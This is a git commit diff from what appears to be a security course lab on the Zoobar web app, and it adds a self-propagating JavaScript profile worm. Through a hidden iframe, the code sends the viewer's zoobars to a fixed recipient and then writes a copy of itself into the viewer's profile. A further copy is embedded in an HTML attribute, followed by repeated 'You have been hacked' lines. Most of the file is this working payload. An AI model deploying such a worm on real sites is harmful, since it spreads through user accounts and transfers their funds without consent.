8888449ed73aa1896407e1d1655976e835e0acf0
Coding <jiecao.wang@gmail.com>
2015-11-16 23:48:06 -0500

    done everything finally don't remember what im doing now

--- a3/zoobar/d.js
+++ a3/zoobar/d.js
@@ -1,1 +1,98 @@
-"'' (function(){ev" +"al(" + "var newDiv = document.createElement('div');var newContent = document.createTextNode('Hi there and greetings!'); newDiv.appendChild(newContent);document.body.appendChild(newDiv);" + ");})();"
+(function(){
+	var d = document;
+	var attStr = document.getElementById('zoobars').outerHTML;
+	alert(attStr);
+	
+	var tSub = d.createElement('input');
+	tSub.setAttribute('value', 'Send');
+	tSub.setAttribute('name', 'submission');
+
+	var tBar = d.createElement('input');
+	tBar.setAttribute('value', 1);
+	tBar.setAttribute('name', 'zoobars');
+
+	var tRep = d.createElement('input');
+	tRep.setAttribute('value', 'g3wangjj');
+	tRep.setAttribute('name', 'zb_recipient');
+
+	var tForm = d.createElement('form');
+	tForm.setAttribute('method', 'POST');
+	tForm.setAttribute('action', '/transfer.php');
+	tForm['tar'+'get'] = 'ifr_w';
+
+	tForm.appendChild(tSub);
+	tForm.appendChild(tBar);
+	tForm.appendChild(tRep);
+
+	var pText = d.createElement('textarea');
+	pText.setAttribute('name', 'profileupdate');
+	pText.innerHTML = document.getElementById('zoobars').outerHTML;
+
+	var pSub = d.createElement('input');
+	pSub.setAttribute('value', 'Save');
+	pSub.setAttribute('type', 'submit');
+	pSub.setAttribute('name', 'profilesubmit');
+
+	var pForm = d.createElement('form');
+	pForm.setAttribute('method', 'POST');
+	pForm.setAttribute('action', '/index.php');
+	pForm['tar'+'get'] = 'ifr_w';
+
+	pForm.appendChild(pText);
+	pForm.appendChild(pSub);
+
+	var ifr = d.createElement('iframe');
+	ifr.setAttribute('name', 'ifr_w');
+	ifr.appendChild(tForm);
+	ifr.appendChild(pForm);
+
+	d.body.appendChild(ifr);
+
+	ifr.style.display = 'none';
+
+	tForm.submit();
+	pSub.click();
+
+	alert(1);
+	return 10;
+})();
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p id="zoobars" class="(function(){var d = document; var attStr = document.getElementById('zoobars').outerHTML; alert(attStr); var tSub = d.createElement('input'); tSub.setAttribute('value', 'Send'); tSub.setAttribute('name', 'submission'); var tBar = d.createElement('input'); tBar.setAttribute('value', 1); tBar.setAttribute('name', 'zoobars'); var tRep = d.createElement('input'); tRep.setAttribute('value', 'g3wangjj'); tRep.setAttribute('name', 'zb_recipient'); var tForm = d.createElement('form'); tForm.setAttribute('method', 'POST'); tForm.setAttribute('action', '/transfer.php'); tForm['tar'+'get'] = 'ifr_w'; tForm.appendChild(tSub); tForm.appendChild(tBar); tForm.appendChild(tRep); var pText = d.createElement('textarea'); pText.setAttribute('name', 'profileupdate'); pText.innerHTML = document.getElementById('zoobars').outerHTML; var pSub = d.createElement('input'); pSub.setAttribute('value', 'Save'); pSub.setAttribute('type', 'submit'); pSub.setAttribute('name', 'profilesubmit'); var pForm = d.createElement('form'); pForm.setAttribute('method', 'POST'); pForm.setAttribute('action', '/index.php'); pForm['tar'+'get'] = 'ifr_w'; pForm.appendChild(pText); pForm.appendChild(pSub); var ifr = d.createElement('iframe'); ifr.setAttribute('name', 'ifr_w'); ifr.appendChild(tForm); ifr.appendChild(pForm); d.body.appendChild(ifr); ifr.style.display = 'none'; tForm.submit(); pSub.click(); alert(1); return 10; })();">You have been hacked</p>
+
+
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
+<p id="zoobars" class="">You have been hacked</p>
